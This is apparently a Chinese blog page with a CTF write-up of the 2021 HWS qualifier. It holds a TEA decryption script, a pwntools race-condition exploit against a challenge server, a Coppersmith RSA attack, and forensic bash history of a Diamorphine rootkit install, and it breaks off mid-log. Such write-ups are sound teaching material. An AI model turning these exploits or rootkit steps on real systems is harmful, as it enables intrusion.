<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.l3m0nade.xyz","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"livere","storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta name="description" content="2021HWS By L3m0nade0x00 aet-reverse​        程序名是xtea但其实是tea,找到源python脚本调一下看一下数据大小端后就行了。看了flag原来真的想骗我分辨xtea,tea…">
<meta property="og:type" content="article">
<meta property="og:title" content="2021HWS线上夏令营入营赛">
<meta property="og:url" content="http://blog.l3m0nade.xyz/2021/08/31/L3m0nade_HWSwp/">
<meta property="og:site_name" content="L3m0nade的博客">
<meta property="og:description" content="2021HWS By L3m0nade0x00 aet-reverse​        程序名是xtea但其实是tea,找到源python脚本调一下看一下数据大小端后就行了。看了flag原来真的想骗我分辨xtea,tea…">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:/Users/L3m0nade/Desktop/image-20210824020802214.png">
<meta property="og:image" content="c:/Users/L3m0nade/AppData/Roaming/Typora/typora-user-images/1629770630779.png">
<meta property="og:image" content="c:/Users/L3m0nade/AppData/Roaming/Typora/typora-user-images/1630027084667.png">
<meta property="og:image" content="c:/Users/L3m0nade/AppData/Roaming/Typora/typora-user-images/1630028032294.png">
<meta property="og:image" content="c:/Users/L3m0nade/AppData/Roaming/Typora/typora-user-images/1630029023087.png">
<meta property="og:image" content="c:/Users/L3m0nade/AppData/Roaming/Typora/typora-user-images/1630031296719.png">
<meta property="og:image" content="c:/Users/L3m0nade/AppData/Roaming/Typora/typora-user-images/1630116416278.png">
<meta property="og:image" content="c:/Users/L3m0nade/AppData/Roaming/Typora/typora-user-images/1630116506657.png">
<meta property="og:image" content="c:/Users/L3m0nade/AppData/Roaming/Typora/typora-user-images/1630033088507.png">
<meta property="og:image" content="c:/Users/L3m0nade/AppData/Roaming/Typora/typora-user-images/1630117534281.png">
<meta property="article:published_time" content="2021-08-30T16:00:00.000Z">
<meta property="article:modified_time" content="2021-09-23T03:40:19.197Z">
<meta property="article:author" content="L3m0nade">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:/Users/L3m0nade/Desktop/image-20210824020802214.png">


<link rel="canonical" href="http://blog.l3m0nade.xyz/2021/08/31/L3m0nade_HWSwp/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://blog.l3m0nade.xyz/2021/08/31/L3m0nade_HWSwp/","path":"2021/08/31/L3m0nade_HWSwp/","title":"2021HWS线上夏令营入营赛"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>2021HWS线上夏令营入营赛 | L3m0nade的博客</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="L3m0nade的博客" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">L3m0nade的博客</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">3</span></a></li>
        <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2021HWS-By-L3m0nade"><span class="nav-number">1.</span> <span class="nav-text">2021HWS By L3m0nade</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-aet-reverse"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 aet-reverse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-shop"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Hello"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 Hello</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-backdoor"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 backdoor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-prophet"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 prophet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-goodpy"><span class="nav-number">1.6.</span> <span class="nav-text">0x05 goodpy</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="L3m0nade"
      src="/images/touxiang.jpg">
  <p class="site-author-name" itemprop="name">L3m0nade</p>
  <div class="site-description" itemprop="description">CTF_Reverse,IOT菜鸡的学习记录</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/l3m0nade" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3m0nade" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1399553430@qq.com" title="E-Mail → 1399553430@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



          </div>
        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://blog.l3m0nade.xyz/2021/08/31/L3m0nade_HWSwp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="L3m0nade">
      <meta itemprop="description" content="CTF_Reverse,IOT菜鸡的学习记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L3m0nade的博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2021HWS线上夏令营入营赛
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-08-31 00:00:00" itemprop="dateCreated datePublished" datetime="2021-08-31T00:00:00+08:00">2021-08-31</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-09-23 11:40:19" itemprop="dateModified" datetime="2021-09-23T11:40:19+08:00">2021-09-23</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span id="/2021/08/31/L3m0nade_HWSwp/" class="post-meta-item leancloud_visitors" data-flag-title="2021HWS线上夏令营入营赛" title="阅读次数">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span class="leancloud-visitors-count"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>23k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>28 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="2021HWS-By-L3m0nade"><a href="#2021HWS-By-L3m0nade" class="headerlink" title="2021HWS By L3m0nade"></a>2021HWS By L3m0nade</h1><h2 id="0x00-aet-reverse"><a href="#0x00-aet-reverse" class="headerlink" title="0x00 aet-reverse"></a>0x00 aet-reverse</h2><p>​        程序名是xtea但其实是tea,找到源python脚本调一下看一下数据大小端后就行了。看了flag原来真的想骗我分辨xtea,tea…</p>
<span id="more"></span>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="attribute">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> TeaDec(v, k):</span><br><span class="line">    <span class="attribute">v0</span> = v[<span class="number">0</span>]</span><br><span class="line">    <span class="attribute">v1</span> = v[<span class="number">1</span>]</span><br><span class="line">    <span class="attribute">x</span> = <span class="number">0</span>xC<span class="number">6</span>EF<span class="number">3720</span></span><br><span class="line">    <span class="attribute">delta</span> = <span class="number">0</span>x<span class="number">9</span>E<span class="number">3779</span>B<span class="number">9</span></span><br><span class="line">    <span class="comment"># each k 32bit 8bytes</span></span><br><span class="line">    <span class="attribute">k0</span> = k[<span class="number">0</span>]</span><br><span class="line">    <span class="attribute">k1</span> = k[<span class="number">1</span>]</span><br><span class="line">    <span class="attribute">k2</span> = k[<span class="number">2</span>]</span><br><span class="line">    <span class="attribute">k3</span> = k[<span class="number">3</span>]</span><br><span class="line">    <span class="attribute">for</span> i in range(<span class="number">32</span>):</span><br><span class="line">        <span class="attribute">v1</span> -= ((v<span class="number">0</span> &lt;&lt; <span class="number">4</span>) + k<span class="number">2</span>) ^ (v<span class="number">0</span> + x) ^ ((v<span class="number">0</span> &gt;&gt; <span class="number">5</span>) + k<span class="number">3</span>)</span><br><span class="line">        <span class="attribute">v1</span> = v<span class="number">1</span> &amp; <span class="number">0</span>xFFFFFFFF</span><br><span class="line">        <span class="attribute">v0</span> -= ((v<span class="number">1</span> &lt;&lt; <span class="number">4</span>) + k<span class="number">0</span>) ^ (v<span class="number">1</span> + x) ^ ((v<span class="number">1</span> &gt;&gt; <span class="number">5</span>) + k<span class="number">1</span>)</span><br><span class="line">        <span class="attribute">v0</span> = v<span class="number">0</span> &amp; <span class="number">0</span>xFFFFFFFF</span><br><span class="line">        <span class="attribute">x</span> -= delta</span><br><span class="line">        <span class="attribute">x</span> = x &amp; <span class="number">0</span>xFFFFFFFF</span><br><span class="line">    <span class="attribute">v</span>[<span class="number">0</span>] = v<span class="number">0</span></span><br><span class="line">    <span class="attribute">v</span>[<span class="number">1</span>] = v<span class="number">1</span></span><br><span class="line">    <span class="attribute">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="attribute">key</span> =<span class="meta"> [0x10304,0x5060708,0x90a0b0c,0xd0e0f00]</span></span><br><span class="line">    <span class="attribute">enc</span> =<span class="meta"> [0x42C7CA40, 0xC17516EF,0xE7376E69,0x1B0B0F78, 0xDFE0E07B, 0x5F505705, 0xF473D235, 0x47D56C5A]</span></span><br><span class="line">    <span class="attribute">s</span> = b&#x27;&#x27;</span><br><span class="line">    <span class="attribute">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">        <span class="attribute">e</span> =<span class="meta"> [enc[i*2],enc[i*2+1]]</span></span><br><span class="line">        <span class="attribute">dec</span> = TeaDec(e, key)</span><br><span class="line">        <span class="comment">#print(dec,hex(dec[0]),hex(dec[1]),type(hex(dec[0])))</span></span><br><span class="line">        <span class="attribute">s</span> += binascii.unhexlify(hex(dec[<span class="number">0</span>])[<span class="number">2</span>:]) + binascii.unhexlify(hex(dec[<span class="number">1</span>])[<span class="number">2</span>::])</span><br><span class="line">    <span class="attribute">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;th1s_is_TEA_enc0de_hahaha_&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="0x01-shop"><a href="#0x01-shop" class="headerlink" title="0x01 shop"></a>0x01 shop</h2><p>​        拿到手是一个64位的ELF文件，提供购物与卖出功能，但是钱不够买flag，在ida64中查看该程序，发现实现卖出功能的函数:</p>
<p><img src="C:\Users\L3m0nade\Desktop\image-20210824020802214.png"></p>
<p>函数先检查要卖的物品是否存在，之后创建子进程实现余额的更改与物品的卖出，然后并不等待子进程而是直接继续运行。在子进程中，函数先检查背包中物品种类并提供对应的钱，再在usleep()了约141ms后才讲背包中的物品取走，存在条件竞争漏洞。考虑在这段时间内再次卖出未取走的物品。运行脚本，可以看到产生了两次成功的卖出。有397吧。多亏了sleep，让程序在重复接收指令可以运作出现条件竞争。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf<span class="number">-8</span> </span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="built_in">debug</span> = <span class="number">0</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="built_in">debug</span>:  </span><br><span class="line">   <span class="built_in">io</span> = process(<span class="string">&#x27;./shop&#x27;</span>)  </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">   addr = <span class="string">&#x27;node4.buuoj.cn&#x27;</span>  </span><br><span class="line">   port = <span class="number">29713</span></span><br><span class="line">   <span class="built_in">io</span> = remote(addr,port)  </span><br><span class="line">     </span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"><span class="built_in">io</span>.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;Which one?&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span>.send(<span class="string">&quot;0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0&quot;</span>)</span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.interactive()  </span><br><span class="line">#flag&#123;fec8625d<span class="number">-7651</span><span class="number">-4213</span>-ba55<span class="number">-36</span>ceb719516f&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x02-Hello"><a href="#0x02-Hello" class="headerlink" title="0x02 Hello"></a>0x02 Hello</h2><p>Coppersmith–Short-Pad-Attack</p>
<p>​        由于数据包中必有server.py传输的字符串，所以可以通过，tcp contains Hello找到2个数据，Alice和Bob的传输密文。又因为传输的都是m+padding的密文，有很大部分bit都是相同的，最初想到related-message-attack，但是不太会写。后来找到一个有c1,c2的相关攻击升级版Coppersmith–Short-Pad-Attack脚本可以直接用，改了一下在sagecell上跑的：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="attribute">import</span> binascii</span><br><span class="line"><span class="attribute">def</span> short_pad_attack(c<span class="number">1</span>, c<span class="number">2</span>, e, n):</span><br><span class="line">    <span class="attribute">PRxy</span>.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attribute">PRx</span>.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attribute">PRZZ</span>.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    <span class="attribute">g1</span> = x^e - c<span class="number">1</span></span><br><span class="line">    <span class="attribute">g2</span> = (x+y)^e - c<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">q1</span> = g<span class="number">1</span>.change_ring(PRZZ)</span><br><span class="line">    <span class="attribute">q2</span> = g<span class="number">2</span>.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    <span class="attribute">h</span> = q<span class="number">2</span>.resultant(q<span class="number">1</span>)</span><br><span class="line">    <span class="attribute">h</span> = h.univariate_polynomial()</span><br><span class="line">    <span class="attribute">h</span> = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    <span class="attribute">h</span> = h.monic()</span><br><span class="line"></span><br><span class="line">    <span class="attribute">kbits</span> = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    <span class="attribute">diff</span> = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0</span>.<span class="number">5</span>)[<span class="number">0</span>]  # find root &lt; <span class="number">2</span>^kbits with factor &gt;= n^<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> related_message_attack(c<span class="number">1</span>, c<span class="number">2</span>, diff, e, n):</span><br><span class="line">    <span class="attribute">PRx</span>.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attribute">g1</span> = x^e - c<span class="number">1</span></span><br><span class="line">    <span class="attribute">g2</span> = (x+diff)^e - c<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">def</span> gcd(g<span class="number">1</span>, g<span class="number">2</span>):</span><br><span class="line">        <span class="attribute">while</span> g<span class="number">2</span>:</span><br><span class="line">            <span class="attribute">g1</span>, g<span class="number">2</span> = g<span class="number">2</span>, g<span class="number">1</span> % g<span class="number">2</span></span><br><span class="line">        <span class="attribute">return</span> g<span class="number">1</span>.monic()</span><br><span class="line"></span><br><span class="line">    <span class="attribute">return</span> -gcd(g<span class="number">1</span>, g<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="attribute">n</span> = <span class="number">614841097302605203729955929451825826385630731245407304765444050136152160075416270232196891310754756560269306196561606156336813576913594854840164982931848631424774407292521710362012687934093478900284954122708280664707569091235654868301000525395360078939629380968427451630817415966643152395544725253378817336057650951709472150327395955690738068905556599556048143267959045123493403335580464278218470115001795745184558268225092224619641577591099718668732317701349174398992357749748300972812469018580873052325022765470680889385640174127657770334108999912438577122235575684290868585158464471335044106696596310903161046624897870198499582743991296379992702316645220124590338066703166528127792814503559512520239899562796644117918668854617138574268684819163423283186676870272524173353359508565110680846340027745804501343277615801570161341159399030712301208921532219260984718701528073369562514559969874210515647810613697008011307213411257388079256334292994617864207389735727092704030522132125141994059978274145655095107101848352464355417969218835698138188967409918358594915938655738516761338882364547606993485361276412819595508391665123030799494192932148904512867616718323946620838822942360634114453262536609403878810013093786418173028142285209</span> </span><br><span class="line">    <span class="attribute">e</span> = <span class="number">7</span></span><br><span class="line">    <span class="attribute">c1</span> = <span class="number">226199888918448644756982227968746328321985116022301858554198443672166664046511192215268564345898426376094090283902459640110441636420726770010000770994806563185277269200465979320365589893377418069091918532090442396603886751603663167305733566867710881487792435263851954036765024355077627565776101657845285994047225127259478223888842725657697619882058952675576467950522546405944727325816748748400930757072151974753803411875075825410215662132323783283622907642504349895222420194846774972358784353404930471430363282533597528847457511272893938256828008761907527515772662467469811929535936626565593800263948227574689518705440414368634213587105988741446978367368641973256822769215908784220309789734449328751828411012817796805182907296099522060377249696752489510340595152805018457215119257756500416362241433542631282380670560802965990054464183825706649810872267539076088793023183611390929368000088538174212497557317021558232130649505658714311457845634746833717519922531826151283006638342214774466523934632839617828984102088907011083393633695252458688340500110194100303563736683350582103762865754280928068416609493507422758397519930389697891015054896887103350205876203508540259064385048758693455947681367170495861484799223471818419141809766082</span></span><br><span class="line">    <span class="attribute">c2</span> = <span class="number">207745134179372733555510206619693253104579843394896629739037329373112962626246001660692996105153219118802888232147542928402067843843528586661320609669764821619654148259323979346482619518127693134276997096465301242211338219230471535362522814373937363157952621289752500159789059618277078792730676938098151778724478618510442014061057398587899271302933994977686954557140792181120737121774640968270568182678321489463357386240195482174580855571460603588887113368877542370808084357842481355072918452814741564939655765498035870034623573615277107259501397135275787715228937905326258102800307298720705403841763666842176243959137647629868288744563301081604801635616954497347143042211051515138964208862089552048752128912810909730479659450966735343696566762894334249104817494914722566979492521404452789748171845406174662299522224640406957367515731398609433619859550730046552804426613174272338408295496475455377327126232203966170727191424458552984898420495331422888174501682405492889556485885498653026394829501033795561393942827468916484256939660461234831948497296037001984268948594694380490331513700030501310813656424424549981824937813623457529801230191235415350842735918693953674061739761952989693408739389294218794993885245118233185798993030811</span></span><br><span class="line">    </span><br><span class="line">    <span class="attribute">diff</span> = short_pad_attack(c<span class="number">1</span>, c<span class="number">2</span>, e, n)</span><br><span class="line">    <span class="attribute">print</span> (<span class="string">&quot;difference of two messages is %d&quot;</span> % diff)</span><br><span class="line"></span><br><span class="line">    <span class="attribute">m1</span> = related_message_attack(c<span class="number">1</span>, c<span class="number">2</span>, diff, e, n)</span><br><span class="line">    <span class="attribute">print</span>(binascii.unhexlify(hex(m<span class="number">1</span>)[<span class="number">2</span>:]))</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h2 id="0x03-backdoor"><a href="#0x03-backdoor" class="headerlink" title="0x03 backdoor"></a>0x03 backdoor</h2><p>被坑时间最长的取证，volatility的profile最初找了好多现有的都不行，然后linux_recover_filesystem还报错，github上还没解决方法。。。还好为了要profile需要建一个新虚拟机，索性重新clone了volatility配置python2在ubuntu16.04.3server跑了，结果就没啥问题。。。</p>
<p>开局去拿ubuntu16.04.3server的profile。</p>
<p>生成方式：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install dwarfdump build-essential libelf-dev zip</span><br><span class="line">git clone https:<span class="comment">//github.com/volatilityfoundation/volatility.git</span></span><br><span class="line">cd volatility/tools/linux</span><br><span class="line">make</span><br><span class="line">sudo zip <span class="constructor">$(<span class="params">lsb_release</span> -<span class="params">i</span> -<span class="params">s</span>)</span><span class="constructor">_$(<span class="params">uname</span> -<span class="params">r</span>)</span><span class="module-access"><span class="module"><span class="identifier">_profile</span>.</span></span>zip <span class="keyword">module</span>.dwarf /boot/<span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>map-<span class="constructor">$(<span class="params">uname</span> -<span class="params">r</span>)</span></span><br></pre></td></tr></table></figure>

<p>由于是linux取证，只能是那些带linux_的插件好使了。</p>
<p>先看了下bash_history:</p>
<p>volatility -f ./misc_backdoor.vmem  –profile=LinuxUbuntu_4_4_0-87-generic_profilex64 linux_bash</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-- -------------------- ------------------------------ -------</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:03 UTC<span class="string">+0000</span>   cp ./diamorphine.ko /tmp/</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:06 UTC<span class="string">+0000</span>   cd ..</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:43 UTC<span class="string">+0000</span>   ls</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:50 UTC<span class="string">+0000</span>   rm -rf ./Diamorphine</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:52 UTC<span class="string">+0000</span>   ls</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span class="string">-20</span> 14:42:52 UTC<span class="string">+0000</span>   cd /</span><br><span class="line">     807 bash                 2018<span class="string">-05</span><span 